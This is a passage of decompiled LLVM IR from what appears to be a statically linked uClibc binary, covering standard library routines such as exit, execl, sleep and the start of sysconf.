  %v1_804d4e3 = urem i32 %v0_804d512, 256
  store i32 %v1_804d4e3, i32* %eax.global-to-local, align 4
  %v1_804d4e6 = load i32, i32* %esi.global-to-local, align 4
  %v2_804d4e6 = sub i32 %v1_804d4e3, %v1_804d4e6
  %v10_804d4e6 = and i32 %v2_804d4e6, %v1_804d4e6
  %v11_804d4e6 = icmp slt i32 %v10_804d4e6, 0
  %v13_804d4e6 = icmp slt i32 %v2_804d4e6, 0
  %v2_804d4e8 = icmp eq i1 %v13_804d4e6, %v11_804d4e6
  br i1 %v2_804d4e8, label %dec_label_pc_804d519, label %dec_label_pc_804d4ea

dec_label_pc_804d4ea:                             ; preds = %dec_label_pc_804d4e3
  %v1_804d4ea = add i32 %v0_804d4ea, 1
  store i32 %v1_804d4ea, i32* %ebx.global-to-local, align 4
  %v0_804d4eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804d4eb = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_804d4eb, %v1_804d4eb
  br i1 %tmp56, label %dec_label_pc_804d4f7, label %dec_label_pc_804d4ef

dec_label_pc_804d4ef:                             ; preds = %dec_label_pc_804d4ea
  %v12_804d4eb = icmp eq i32 %v0_804d4eb, %v1_804d4eb
  %v1_804d4ef = icmp eq i1 %v12_804d4eb, false
  br i1 %v1_804d4ef, label %dec_label_pc_804d50f, label %dec_label_pc_804d4f1

dec_label_pc_804d4f1:                             ; preds = %dec_label_pc_804d4ef
  %v1_804d4f1 = trunc i32 %v0_804d512 to i8
  %tmp57 = icmp ugt i8 %v1_804d4f1, %v1_804d4be
  br i1 %tmp57, label %dec_label_pc_804d4f7, label %dec_label_pc_804d50f

dec_label_pc_804d4f7:                             ; preds = %dec_label_pc_804d4f1, %dec_label_pc_804d4ea
  store i32 %v4_804d4f7, i32* %eax.global-to-local, align 4
  %v6_804d4fb = and i8 %stack_var_-18.2, %tmp37
  %v1_804d4ff = sext i8 %v6_804d4fb to i32
  %v2_804d4ff = call i32 @__errno_location(i32 %v1_804d4ff)
  store i32 %v2_804d4ff, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804d507 = inttoptr i32 %v2_804d4ff to i32*
  store i32 34, i32* %v1_804d507, align 4
  %v0_804d4c8.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804d4ca.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_804d4cc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804d4c8

dec_label_pc_804d50f:                             ; preds = %dec_label_pc_804d4f1, %dec_label_pc_804d4ef
  %v4_804d50f = mul i32 %v0_804d4eb, %v1_804d4e6
  store i32 %v1_804d4e3, i32* %eax.global-to-local, align 4
  %v2_804d515 = add i32 %v4_804d50f, %v1_804d4e3
  store i32 %v2_804d515, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d4c8

dec_label_pc_804d519:                             ; preds = %dec_label_pc_804d4e3, %dec_label_pc_804d4ad
  %v0_804d524 = phi i32 [ %v0_804d52423, %dec_label_pc_804d4ad ], [ %v0_804d52421, %dec_label_pc_804d4e3 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804d4ad ], [ %stack_var_-18.2, %dec_label_pc_804d4e3 ]
  %v4_804d519 = icmp eq i32 %arg2, 0
  br i1 %v4_804d519, label %dec_label_pc_804d526, label %dec_label_pc_804d520

dec_label_pc_804d520:                             ; preds = %dec_label_pc_804d519
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804d524 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804d524, i32* %v2_804d524, align 4
  br label %dec_label_pc_804d526

dec_label_pc_804d526:                             ; preds = %dec_label_pc_804d519, %dec_label_pc_804d520
  %v8_804d526 = icmp eq i8 %stack_var_-18.3, 0
  %v2_804d52b = zext i1 %v8_804d526 to i32
  %v13_804d52b = icmp eq i1 %v8_804d526, false
  %v1_804d52d3 = or i32 %v2_804d52b, -2147483648
  store i32 %v1_804d52d3, i32* %ebx.global-to-local, align 4
  %v5_804d533 = icmp eq i8 %tmp37, 0
  br i1 %v5_804d533, label %dec_label_pc_804d54b, label %dec_label_pc_804d53a

dec_label_pc_804d53a:                             ; preds = %dec_label_pc_804d526
  %v0_804d53a = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_804d53a, %v1_804d52d3
  br i1 %tmp58, label %dec_label_pc_804d53e, label %dec_label_pc_804d54b

dec_label_pc_804d53e:                             ; preds = %dec_label_pc_804d53a
  %v1_804d53e = sext i8 %stack_var_-18.3 to i32
  %v2_804d53e = call i32 @__errno_location(i32 %v1_804d53e)
  store i32 %v2_804d53e, i32* %eax.global-to-local, align 4
  %v0_804d543 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804d543, i32* %edx.global-to-local, align 4
  %v1_804d545 = inttoptr i32 %v2_804d53e to i32*
  store i32 34, i32* %v1_804d545, align 4
  br label %dec_label_pc_804d54b

dec_label_pc_804d54b:                             ; preds = %dec_label_pc_804d53a, %dec_label_pc_804d526, %dec_label_pc_804d53e
  %v0_804d54b = load i32, i32* %edx.global-to-local, align 4
  %v1_804d54d = sub i32 0, %v0_804d54b
  %v4_804d554 = select i1 %v13_804d52b, i32 %v1_804d54d, i32 %v0_804d54b
  store i32 %v4_804d554, i32* @edx, align 4
  %v2_804d55a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d55a, i32* @ebx, align 4
  store i32 %v4_804d554, i32* %eax.global-to-local, align 4
  ret i32 %v4_804d554

; uselistorder directives
  uselistorder i32 %v4_804d554, { 1, 0, 2 }
  uselistorder i1 %v8_804d526, { 1, 0 }
  uselistorder i8 %v6_804d4fb, { 1, 0 }
  uselistorder i32 %v1_804d4eb, { 1, 0 }
  uselistorder i32 %v0_804d4eb, { 2, 1, 0 }
  uselistorder i32 %v1_804d4ea, { 1, 0 }
  uselistorder i32 %v2_804d4e6, { 1, 0 }
  uselistorder i32 %v1_804d4e3, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804d512, { 2, 0, 1 }
  uselistorder i8 %v2_804d4d6, { 1, 0, 2 }
  uselistorder i32 %v14_804d4ce, { 0, 2, 1 }
  uselistorder i32 %v0_804d4c8, { 1, 0 }
  uselistorder i32 %v0_804d4bc, { 1, 0, 2 }
  uselistorder i32 %v3_804d4aa, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804d49f, { 1, 0 }
  uselistorder i32 %v1_804d492, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_804d491, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_804d45a.lcssa, { 1, 0 }
  uselistorder i32 %v0_804d459.lcssa, { 1, 0 }
  uselistorder i32 %v1_804d459, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804d44f, { 1, 0, 2 }
  uselistorder i32 %v4_804d447, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i32 -17, { 1, 3, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d54b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d526, { 1, 0 }
  uselistorder label %dec_label_pc_804d4e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d4ca, { 1, 0 }
  uselistorder label %dec_label_pc_804d4ad, { 1, 0 }
  uselistorder label %dec_label_pc_804d4a2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d47f, { 1, 0 }
  uselistorder label %dec_label_pc_804d47e, { 1, 0 }
  uselistorder label %dec_label_pc_804d459, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804d577 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d577, i32* @ebx, align 4
  %v2_804d57c = call i32 @__pthread_return_void(i32 %v2_804d577, i32 134535499)
  %v1_804d588 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053700.374 to i32))
  %v0_804d58d = load i32, i32* @global_var_8055dc4.375, align 4
  store i32 %v0_804d58d, i32* @eax, align 4
  %v1_804d595 = icmp eq i32 %v0_804d58d, 0
  br i1 %v1_804d595, label %dec_label_pc_804d5a2, label %dec_label_pc_804d599

dec_label_pc_804d599:                             ; preds = %entry
  %v0_804d59c = load i32, i32* @esi, align 4
  %v1_804d59d = call i32 @unknown_0(i32 %v0_804d59c)
  store i32 %v1_804d59d, i32* @eax, align 4
  br label %dec_label_pc_804d5a2

dec_label_pc_804d5a2:                             ; preds = %entry, %dec_label_pc_804d599
  %v2_804d5a7 = call i32 @__pthread_return_void(i32 %v2_804d577, i32 1)
  %v0_804d5ac = call i32 @__GI___uClibc_fini()
  %v0_804d5bd = call i32 @_stdio_term()
  %v0_804d5c5 = load i32, i32* @esi, align 4
  %v1_804d5c6 = call i32 @__GI__exit(i32 %v0_804d5c5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d5a2, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804d5d2 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5d2, i32* %stack_var_-12, align 4
  %v2_804d5d3 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_804d5d3, i32* %eax.global-to-local, align 4
  %v12_804d5d6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804d5dc

dec_label_pc_804d5dc:                             ; preds = %dec_label_pc_804d5dc, %entry
  %v0_804d5df = phi i32 [ 0, %entry ], [ %v1_804d5df, %dec_label_pc_804d5dc ]
  %stack_var_-16.0 = phi i32 [ %v2_804d5d3, %entry ], [ %v1_804d5e0, %dec_label_pc_804d5dc ]
  %v1_804d5df = add i32 %v0_804d5df, 1
  store i32 %v1_804d5df, i32* %esi.global-to-local, align 4
  %v1_804d5e0 = add i32 %stack_var_-16.0, 4
  store i32 %v1_804d5e0, i32* %eax.global-to-local, align 4
  %v1_804d5e6 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_804d5e6 = load i32, i32* %v1_804d5e6, align 4
  %v3_804d5e6 = icmp eq i32 %v2_804d5e6, 0
  %v1_804d5e9 = icmp eq i1 %v3_804d5e6, false
  br i1 %v1_804d5e9, label %dec_label_pc_804d5dc, label %dec_label_pc_804d5eb

dec_label_pc_804d5eb:                             ; preds = %dec_label_pc_804d5dc
  %v1_804d5eb = mul i32 %v1_804d5df, 4
  %v2_804d5eb = add i32 %v1_804d5eb, 34
  %v1_804d5f2 = and i32 %v2_804d5eb, -16
  %v2_804d5f5 = sub i32 %v12_804d5d6, %v1_804d5f2
  %v1_804d5fa = add i32 %v2_804d5f5, 15
  %v1_804d5fe = and i32 %v1_804d5fa, -16
  store i32 %v1_804d5fe, i32* @ebx, align 4
  store i32 %v1_804d5fe, i32* %ecx.global-to-local, align 4
  %v2_804d603 = inttoptr i32 %v1_804d5fe to i32*
  store i32 %arg2, i32* %v2_804d603, align 16
  store i32 %v2_804d5d3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d60b

dec_label_pc_804d60b:                             ; preds = %dec_label_pc_804d60b, %dec_label_pc_804d5eb
  %stack_var_-16.1 = phi i32 [ %v2_804d5d3, %dec_label_pc_804d5eb ], [ %v1_804d612, %dec_label_pc_804d60b ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_804d60e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d60e = add i32 %v0_804d60e, 4
  store i32 %v1_804d60e, i32* %ecx.global-to-local, align 4
  %v0_804d611 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d611 = add i32 %v0_804d611, -1
  %v8_804d611 = icmp eq i32 %v1_804d611, 0
  store i32 %v1_804d611, i32* %esi.global-to-local, align 4
  %v1_804d612 = add i32 %stack_var_-16.1, 4
  %v1_804d618 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_804d618 = load i32, i32* %v1_804d618, align 4
  store i32 %v2_804d618, i32* %eax.global-to-local, align 4
  %v2_804d61a = inttoptr i32 %v1_804d60e to i32*
  store i32 %v2_804d618, i32* %v2_804d61a, align 4
  %v1_804d61c = icmp eq i1 %v8_804d611, false
  br i1 %v1_804d61c, label %dec_label_pc_804d60b, label %dec_label_pc_804d61e

dec_label_pc_804d61e:                             ; preds = %dec_label_pc_804d60b
  %v0_804d61e = load i32, i32* %eax.global-to-local, align 4
  %v1_804d61e = load i32, i32* @esp, align 4
  %v2_804d61e = add i32 %v1_804d61e, -4
  %v3_804d61e = inttoptr i32 %v2_804d61e to i32*
  store i32 %v0_804d61e, i32* %v3_804d61e, align 4
  %v0_804d61f = load i32, i32* @global_var_8055dcc.376, align 4
  %v2_804d61f = add i32 %v1_804d61e, -8
  %v3_804d61f = inttoptr i32 %v2_804d61f to i32*
  store i32 %v0_804d61f, i32* %v3_804d61f, align 4
  %v0_804d625 = load i32, i32* @ebx, align 4
  %v2_804d625 = add i32 %v1_804d61e, -12
  %v3_804d625 = inttoptr i32 %v2_804d625 to i32*
  store i32 %v0_804d625, i32* %v3_804d625, align 4
  %v5_804d626 = add i32 %v1_804d61e, -16
  %v6_804d626 = inttoptr i32 %v5_804d626 to i32*
  store i32 %arg1, i32* %v6_804d626, align 4
  %v1_804d629 = inttoptr i32 %v1_804d612 to i8*
  %v2_804d629 = call i32 @__GI_execve(i8* %v1_804d629)
  store i32 %v2_804d629, i32* %eax.global-to-local, align 4
  %v2_804d631 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d631, i32* @ebx, align 4
  ret i32 %v2_804d629

; uselistorder directives
  uselistorder i32 %v1_804d611, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_804d5e0, { 1, 0 }
  uselistorder i32 %v1_804d5df, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804d5d3, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_804d638 = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_804d63e = load i32, i32* @edi, align 4
  %v0_804d63f = load i32, i32* @esi, align 4
  %v0_804d640 = load i32, i32* @ebx, align 4
  %v15_804d641 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_804d64e = icmp eq i32 %arg1, 0
  %v1_804d650 = icmp eq i1 %v1_804d64e, false
  br i1 %v1_804d650, label %dec_label_pc_804d662.preheader, label %dec_label_pc_804d7af

dec_label_pc_804d662.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d657

dec_label_pc_804d657:                             ; preds = %dec_label_pc_804d657.dec_label_pc_804d657_crit_edge, %dec_label_pc_804d662.preheader
  %v0_804d657 = phi i32 [ %v15_804d641, %dec_label_pc_804d662.preheader ], [ %v0_804d657.pre, %dec_label_pc_804d657.dec_label_pc_804d657_crit_edge ]
  %v1_804d66229 = phi i32 [ 31, %dec_label_pc_804d662.preheader ], [ %v1_804d662, %dec_label_pc_804d657.dec_label_pc_804d657_crit_edge ]
  %v2_804d657 = mul i32 %v1_804d66229, 4
  %v3_804d657 = add i32 %v2_804d657, 292
  %v4_804d657 = add i32 %v3_804d657, %v0_804d657
  %v5_804d657 = inttoptr i32 %v4_804d657 to i32*
  store i32 0, i32* %v5_804d657, align 4
  %v0_804d662.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804d662 = add i32 %v0_804d662.pre, -1
  %v9_804d662 = icmp slt i32 %v1_804d662, 0
  store i32 %v1_804d662, i32* %eax.global-to-local, align 4
  %v1_804d663 = icmp eq i1 %v9_804d662, false
  br i1 %v1_804d663, label %dec_label_pc_804d657.dec_label_pc_804d657_crit_edge, label %dec_label_pc_804d665

dec_label_pc_804d657.dec_label_pc_804d657_crit_edge: ; preds = %dec_label_pc_804d657
  %v0_804d657.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d657

dec_label_pc_804d665:                             ; preds = %dec_label_pc_804d657
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804d67b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804d67b, i32* @ebx, align 4
  store i32 %v2_804d67b, i32* %stack_var_-460, align 4
  %v4_804d683 = call i32 @__sigaddset(i32 %v2_804d67b, i32 17, i32 %v1_804d662, i32 %v1_804d662)
  store i32 %v4_804d683, i32* %eax.global-to-local, align 4
  %v2_804d68b = icmp slt i32 %v4_804d683, 0
  br i1 %v2_804d68b, label %dec_label_pc_804d7b3, label %dec_label_pc_804d693

dec_label_pc_804d693:                             ; preds = %dec_label_pc_804d665
  %v2_804d694 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804d694, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_804d69f = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804d69f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_804d69f, i32 %v2_804d694)
  store i32 %v4_804d69f, i32* %eax.global-to-local, align 4
  %v1_804d6a7 = icmp eq i32 %v4_804d69f, 0
  %v1_804d6a9 = icmp eq i1 %v1_804d6a7, false
  br i1 %v1_804d6a9, label %dec_label_pc_804d7b3, label %dec_label_pc_804d6af

dec_label_pc_804d6af:                             ; preds = %dec_label_pc_804d693
  store i32 %v2_804d694, i32* %stack_var_-460, align 4
  %v4_804d6b4 = call i32 @__sigismember(i32 %v2_804d694, i32 17, i32 %v4_804d69f, i32 %v4_804d69f)
  store i32 %v4_804d6b4, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_804d6c1 = icmp eq i32 %v4_804d6b4, 0
  br i1 %v1_804d6c1, label %dec_label_pc_804d6d5.preheader, label %dec_label_pc_804d77d

dec_label_pc_804d6d5.preheader:                   ; preds = %dec_label_pc_804d6af
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d6ca

dec_label_pc_804d6ca:                             ; preds = %dec_label_pc_804d6ca.dec_label_pc_804d6ca_crit_edge, %dec_label_pc_804d6d5.preheader
  %v0_804d6ca = phi i32 [ %v15_804d641, %dec_label_pc_804d6d5.preheader ], [ %v0_804d6ca.pre, %dec_label_pc_804d6ca.dec_label_pc_804d6ca_crit_edge ]
  %v1_804d6d528 = phi i32 [ 31, %dec_label_pc_804d6d5.preheader ], [ %v1_804d6d5, %dec_label_pc_804d6ca.dec_label_pc_804d6ca_crit_edge ]
  %v2_804d6ca = mul i32 %v1_804d6d528, 4
  %v3_804d6ca = add i32 %v2_804d6ca, 292
  %v4_804d6ca = add i32 %v3_804d6ca, %v0_804d6ca
  %v5_804d6ca = inttoptr i32 %v4_804d6ca to i32*
  store i32 0, i32* %v5_804d6ca, align 4
  %v0_804d6d5.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_804d6d5 = add i32 %v0_804d6d5.pre, -1
  %v9_804d6d5 = icmp slt i32 %v1_804d6d5, 0
  store i32 %v1_804d6d5, i32* %edx.global-to-local, align 4
  %v1_804d6d6 = icmp eq i1 %v9_804d6d5, false
  br i1 %v1_804d6d6, label %dec_label_pc_804d6ca.dec_label_pc_804d6ca_crit_edge, label %dec_label_pc_804d6d8

dec_label_pc_804d6ca.dec_label_pc_804d6ca_crit_edge: ; preds = %dec_label_pc_804d6ca
  %v0_804d6ca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d6ca

dec_label_pc_804d6d8:                             ; preds = %dec_label_pc_804d6ca
  store i32 %v2_804d67b, i32* %eax.global-to-local, align 4
  store i32 %v2_804d67b, i32* %stack_var_-460, align 4
  %v4_804d6e4 = call i32 @__sigaddset(i32 %v2_804d67b, i32 17, i32 0, i32 0)
  store i32 %v4_804d6e4, i32* %eax.global-to-local, align 4
  %v2_804d6ec = icmp slt i32 %v4_804d6e4, 0
  br i1 %v2_804d6ec, label %dec_label_pc_804d7b3, label %dec_label_pc_804d6f4

dec_label_pc_804d6f4:                             ; preds = %dec_label_pc_804d6d8
  %v2_804d6f5 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_804d6f5, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_804d6fe = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_804d6f5)
  store i32 %v4_804d6fe, i32* %eax.global-to-local, align 4
  %v2_804d706 = icmp slt i32 %v4_804d6fe, 0
  %v1_804d708 = icmp eq i1 %v2_804d706, false
  br i1 %v1_804d708, label %dec_label_pc_804d732, label %dec_label_pc_804d70a

dec_label_pc_804d70a:                             ; preds = %dec_label_pc_804d6f4
  %v0_804d70a = load i32, i32* %stack_var_-460, align 4
  %v1_804d70a = call i32 @__errno_location(i32 %v0_804d70a)
  store i32 %v1_804d70a, i32* %eax.global-to-local, align 4
  %v1_804d70f = inttoptr i32 %v1_804d70a to i32*
  %v2_804d70f = load i32, i32* %v1_804d70f, align 4
  store i32 %v2_804d70f, i32* @esi, align 4
  store i32 %v1_804d70a, i32* @ebx, align 4
  store i32 %v2_804d694, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804d720 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804d720 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d720, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d72b = load i32, i32* @esi, align 4
  %v1_804d72b = load i32, i32* @ebx, align 4
  %v2_804d72b = inttoptr i32 %v1_804d72b to i32*
  store i32 %v0_804d72b, i32* %v2_804d72b, align 4
  %v0_804d7c0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7b6

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d6f4
  %v3_804d732 = load i32, i32* %stack_var_-420, align 4
  %v12_804d732 = icmp eq i32 %v3_804d732, 1
  %v2_804d73e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d73e, i32* @ebx, align 4
  %v1_804d745 = icmp eq i1 %v12_804d732, false
  br i1 %v1_804d745, label %dec_label_pc_804d76c, label %dec_label_pc_804d747

dec_label_pc_804d747:                             ; preds = %dec_label_pc_804d732
  %v0_804d747 = load i32, i32* @edi, align 4
  store i32 %v2_804d73e, i32* %stack_var_-460, align 4
  %v4_804d74b = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804d74b = call i32 @__libc_nanosleep(%timespec* %v4_804d74b, i32 %v2_804d73e, i32 %v0_804d747, i32 %v0_804d747)
  store i32 %v5_804d74b, i32* %eax.global-to-local, align 4
  store i32 %v5_804d74b, i32* @edi, align 4
  %v1_804d752 = call i32 @__errno_location(i32 %v2_804d73e)
  store i32 %v1_804d752, i32* %eax.global-to-local, align 4
  %v1_804d75a = inttoptr i32 %v1_804d752 to i32*
  %v2_804d75a = load i32, i32* %v1_804d75a, align 4
  store i32 %v2_804d75a, i32* @esi, align 4
  store i32 %v1_804d752, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804d763 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804d763 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d763, i32 0)
  store i32 %v4_804d763, i32* %eax.global-to-local, align 4
  %v0_804d768 = load i32, i32* @esi, align 4
  %v1_804d768 = load i32, i32* @ebx, align 4
  %v2_804d768 = inttoptr i32 %v1_804d768 to i32*
  store i32 %v0_804d768, i32* %v2_804d768, align 4
  %v0_804d792.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d78f

dec_label_pc_804d76c:                             ; preds = %dec_label_pc_804d732
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804d772 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804d772 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d772, i32 0)
  store i32 %v4_804d772, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d788

dec_label_pc_804d77d:                             ; preds = %dec_label_pc_804d6af
  %v2_804d77f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d77f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d788

dec_label_pc_804d788:                             ; preds = %dec_label_pc_804d76c, %dec_label_pc_804d77d
  %storemerge3.pre-phi = phi i32 [ %v2_804d73e, %dec_label_pc_804d76c ], [ %v2_804d77f, %dec_label_pc_804d77d ]
  %v3_804d788 = phi i32 [ %v2_804d694, %dec_label_pc_804d76c ], [ %v4_804d6b4, %dec_label_pc_804d77d ]
  %v2_804d788 = phi i32 [ 0, %dec_label_pc_804d76c ], [ %v4_804d6b4, %dec_label_pc_804d77d ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_804d788 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804d788 = call i32 @__libc_nanosleep(%timespec* %v4_804d788, i32 %storemerge3.pre-phi, i32 %v2_804d788, i32 %v3_804d788)
  store i32 %v5_804d788, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d78f

dec_label_pc_804d78f:                             ; preds = %dec_label_pc_804d747, %dec_label_pc_804d788
  %v0_804d792 = phi i32 [ %v0_804d792.pre, %dec_label_pc_804d747 ], [ %v5_804d788, %dec_label_pc_804d788 ]
  %v1_804d792 = icmp eq i32 %v0_804d792, 0
  br i1 %v1_804d792, label %dec_label_pc_804d7af, label %dec_label_pc_804d796

dec_label_pc_804d796:                             ; preds = %dec_label_pc_804d78f
  %v4_804d7a6 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_804d7a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7b6

dec_label_pc_804d7af:                             ; preds = %entry, %dec_label_pc_804d78f
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7b6

dec_label_pc_804d7b3:                             ; preds = %dec_label_pc_804d6d8, %dec_label_pc_804d693, %dec_label_pc_804d665
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7b6

dec_label_pc_804d7b6:                             ; preds = %dec_label_pc_804d7af, %dec_label_pc_804d796, %dec_label_pc_804d70a, %dec_label_pc_804d7b3
  %v0_804d7c0 = phi i32 [ 0, %dec_label_pc_804d7af ], [ %v4_804d7a6, %dec_label_pc_804d796 ], [ %v0_804d7c0.pre, %dec_label_pc_804d70a ], [ -1, %dec_label_pc_804d7b3 ]
  store i32 %v0_804d640, i32* @ebx, align 4
  store i32 %v0_804d63f, i32* @esi, align 4
  store i32 %v0_804d63e, i32* @edi, align 4
  store i32 %v0_804d638, i32* @ebp, align 4
  ret i32 %v0_804d7c0

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d752, { 1, 0, 2 }
  uselistorder i32 %v2_804d73e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804d6d5, { 2, 1, 0 }
  uselistorder i32 %v4_804d6b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804d694, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804d67b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_804d662, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d7b6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d7af, { 1, 0 }
  uselistorder label %dec_label_pc_804d78f, { 1, 0 }
  uselistorder label %dec_label_pc_804d788, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
